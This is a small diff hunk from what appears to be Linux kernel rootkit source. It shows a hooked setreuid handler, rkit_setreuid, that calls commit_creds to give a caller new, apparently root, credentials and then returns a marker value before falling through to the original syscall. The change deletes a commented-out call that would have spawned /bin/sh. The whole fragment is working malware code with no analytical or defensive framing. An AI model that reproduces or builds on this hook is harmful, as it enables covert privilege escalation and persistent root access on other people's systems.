@@ -84,8 +84,7 @@ asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid){
             commit_creds(new);
             return EEXIST;
         }
-        //spawn a new shell 
-        //system ("/bin/sh");
+
     }
     r = (*o_setreuid)(ruid,euid);
     return r;
